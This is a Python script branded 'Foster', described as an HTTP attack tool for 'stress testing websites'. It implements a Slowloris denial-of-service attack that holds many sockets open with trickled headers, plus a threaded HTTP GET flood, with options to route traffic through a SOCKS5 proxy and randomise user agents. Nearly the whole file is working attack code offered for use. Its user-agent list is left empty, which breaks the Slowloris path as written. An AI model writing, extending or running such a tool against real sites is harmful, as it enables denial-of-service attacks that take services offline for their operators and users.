#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import sys
import time
import requests
import threading
from requests.exceptions import RequestException, Timeout

# Print the Foster banner
print(r"""
███████╗ ██████╗ ███████╗████████╗███████╗██████╗
██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
█████╗  ██║   ██║███████╗   ██║   █████╗  ██████╔╝
██╔══╝  ██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝███████║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
Created by LUCIFER and GhostAxe
""")

# Set up argument parsing
parser = argparse.ArgumentParser(
    description="Advanced HTTP attack tool for stress testing websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=50,  # Reduced number of sockets
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-T",
    "--threads",
    default=5,  # Reduced number of threads
    help="Number of threads to use for HTTP requests",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Increases logging",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument(
    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=30,  # Increased sleep time
    type=int,
    help="Time to sleep between each header sent.",
)
parser.add_argument(
    "-u", "--url", type=str, help="Target URL for HTTP flood"
)
parser.add_argument(
    "-H", "--headers", type=str, default='', help="Comma-separated list of custom headers in 'key:value' format"
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

# Basic checks
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host and not args.url:
    print("Host or URL required!")
    parser.print_help()
    sys.exit(1)

# Set up logging
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)

# Proxy setup
if args.useproxy:
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)

# User-agent list
user_agents = [
    # (Add your user agents here as in the original script)
]


# Define send functions
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


# Add send functions to socket/SSL socket
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)
if args.https:
    logging.info("Importing ssl module")
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)


# HTTP Flood Function
def send_request(url, headers, max_retries=3, timeout=10):
    """
    Sends HTTP GET requests to the specified URL with the provided headers.

    Args:
        url (str): The URL to send the request to.
        headers (dict): The headers to include in the request.
        max_retries (int): Number of retries for transient errors.
        timeout (int): Request timeout in seconds.
    """
    default_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    default_headers.update(headers)

    attempt = 0
    while True:
        try:
            response = requests.get(url, headers=default_headers, timeout=timeout)
            if response.ok:
                print(f"Request sent to {url} with status code {response.status_code}")
            else:
                print(f"Request sent to {url} but received status code {response.status_code}")
            break  # Exit loop on successful request
        except Timeout:
            print(f"Request to {url} timed out.")
            attempt += 1
            if attempt >= max_retries:
                print(f"Max retries reached. Failed to request {url}.")
                break
        except RequestException as e:
            print(f"Request error: {e}")
            attempt += 1
            if attempt >= max_retries:
                print(f"Max retries reached. Failed to request {url}.")
                break
        except Exception as e:
            print(f"Unexpected error: {e}")
            break


def launch_http_flood(url, num_threads, headers):
    for _ in range(num_threads):
        threading.Thread(target=send_request, args=(url, headers)).start()


# Slowloris Socket Initialization
def init_socket(ip: str):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.host)
    s.connect((ip, args.port))
    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)
    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s


def slowloris_iteration():
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)
    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return
    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            s = init_socket(args.host)
            if not s:
                continue
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break


def main():
    if args.url:
        headers = {}
        if args.headers:
            for header in args.headers.split(','):
                try:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
                except ValueError:
                    print(f"Invalid header format: {header}")
        launch_http_flood(args.url, args.threads, headers)
        return

    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)
    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", args.sleeptime)
        time.sleep(args.sleeptime)


if __name__ == "__main__":
    list_of_sockets = []
    main()

